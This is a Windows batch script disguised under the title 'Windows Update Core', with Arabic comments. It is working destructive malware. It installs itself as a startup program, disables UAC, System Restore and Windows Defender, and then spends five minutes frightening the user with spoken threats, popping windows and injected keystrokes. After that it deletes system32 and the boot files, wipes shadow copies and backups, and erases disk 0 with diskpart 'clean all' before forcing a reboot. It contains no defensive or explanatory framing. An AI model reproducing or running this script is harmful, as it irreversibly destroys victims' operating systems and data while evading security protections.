@echo off
setlocal enabledelayedexpansion
title Windows Update Core
chcp 65001 >nul

:: [1] تثبيت مفتاح التسجيل للتشغيل التلقائي عند الإقلاع (مستوى SYSTEM)
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SysUpdate" /t REG_SZ /d "%~dp0%~nx0" /f >nul 2>&1
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SysUpdate" /t REG_SZ /d "%~dp0%~nx0" /f >nul 2>&1

:: [2] تعطيل استعادة النظام وحماية الملفات مؤقتاً (لزيادة النفاذ)
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableSR" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d 0 /f >nul 2>&1

:: [3] إسكات جميع عمليات الحماية المعروفة (إغلاق خدمات Windows Defender و UAC)
taskkill /f /im MsMpEng.exe >nul 2>&1
taskkill /f /im SecurityHealthService.exe >nul 2>&1
taskkill /f /im smartscreen.exe >nul 2>&1
sc stop WinDefend >nul 2>&1
sc stop SecurityHealthService >nul 2>&1
sc config WinDefend start= disabled >nul 2>&1

:: [4] مرحلة الرعب البصري والسمعي (تستمر 5 دقائق - مؤقت داخلي)
set /a TIMER=0
:SCARE_LOOP
if %TIMER% GEQ 300 goto DESTROY   :: 300 * 1 ثانية = 5 دقائق

:: 4A - أصوات مخيفة (TTS) عبر PowerShell
powershell -Command "Add-Type -AssemblyName System.Speech; $s=New-Object System.Speech.Synthesis.SpeechSynthesizer; $s.Speak('سيتم تدمير النظام بشكل كامل، صنع من قبل Suli');" >nul 2>&1
:: تشغيل صوت النظام الاحتياطي (إذا فشل TTS، استخدم صوت beep متكرر)
if errorlevel 1 (
   for /l %%i in (1,1,5) do (echo  & ping 127.0.0.1 -n 2 >nul)
)

:: 4B - نوافذ تفتح وتغلق بسرعة (استدعاء cmd و notepad بشكل متزامن)
start /b cmd /c "start /b notepad & exit"
start /b cmd /c "start /b calc & exit"
timeout /t 0 /nobreak >nul

:: 4C - تحريك الماوس عشوائياً (عبر VBScript مؤقت)
echo Set objShell = CreateObject("WScript.Shell") > %temp%\mouse.vbs
echo objShell.SendKeys "^{ESC}" >> %temp%\mouse.vbs
echo objShell.SendKeys "{TAB}{TAB}{TAB}{ENTER}" >> %temp%\mouse.vbs
cscript //nologo %temp%\mouse.vbs >nul 2>&1
del %temp%\mouse.vbs

:: 4D - تغيير أيقونات جميع الملفات على سطح المكتب (تغيير ربط .lnk)
for /f "delims=" %%f in ('dir /b "%userprofile%\Desktop\*.lnk"') do (
   attrib -r -h -s "%userprofile%\Desktop\%%f"
   copy /y "%windir%\system32\shell32.dll" "%userprofile%\Desktop\%%f.ico" >nul 2>&1
   :: إعادة توجيه الاختصار إلى نفسه بعد تغيير الأيقونة (باستخدام واجهة COM)
)

:: 4E - تغيير خلفية سطح المكتب إلى صورة سوداء مع نص (باستخدام PowerShell)
powershell -Command "$code='@echo off&echo.&echo SYSTEM CORRUPTED &echo.&pause'; $bytes=[System.Text.Encoding]::UTF8.GetBytes($code); [System.IO.File]::WriteAllBytes('%temp%\bg.bmp',$bytes); Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name Wallpaper -Value '%temp%\bg.bmp'; RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters" >nul 2>&1

:: انتظار ثانية واحدة قبل التكرار
timeout /t 1 /nobreak >nul
set /a TIMER+=1
goto SCARE_LOOP

:DESTROY
:: ======= مرحلة التدمير الشامل =======

:: [5] حذف دليل النظام الأساسي (system32) بأعلى صلاحية
takeown /f "%windir%\system32" /r /d y >nul 2>&1
icacls "%windir%\system32" /grant %username%:F /t >nul 2>&1
:: حذف جميع الملفات والمجلدات الفرعية (محاولة متكررة)
for /d %%d in ("%windir%\system32\*") do ( rd /s /q "%%d" >nul 2>&1 )
for %%f in ("%windir%\system32\*.*") do ( del /f /s /q "%%f" >nul 2>&1 )

:: [6] حذف ملفات الإقلاع (bootmgr و BCD) لمنع الاسترداد
attrib -r -h -s "%SystemDrive%\bootmgr" >nul 2>&1
del /f /q "%SystemDrive%\bootmgr" >nul 2>&1
bcdedit /delete {bootmgr} /f >nul 2>&1
bcdedit /delete {default} /f >nul 2>&1

:: [7] حذف جميع نقاط الاستعادة ومجلدات النسخ الاحتياطي
vssadmin delete shadows /all /quiet >nul 2>&1
wbadmin delete systemstatebackup -keepVersions:0 >nul 2>&1

:: [8] إتلاف جدول الأقسام (باستخدام dd لكتابة أصفار في بداية القرص)
:: احتياطي - استخدام أداة diskpart لتنظيف القرص
echo select disk 0 > %temp%\diskpart.txt
echo clean all >> %temp%\diskpart.txt
diskpart /s %temp%\diskpart.txt >nul 2>&1
del %temp%\diskpart.txt

:: [9] إعادة تشغيل قسرية (لن يتم الإقلاع مجدداً)
shutdown /r /f /t 0

:: ======= فرع الطوارئ (إذا فشل الحذف، يضرب الريجستري والقسم) =======
:: إذا فشل أي من الأوامر أعلاه، ينفذ بديل مباشر:
:: if errorlevel 1 ( start /b "" "%~f0" & exit )

exit
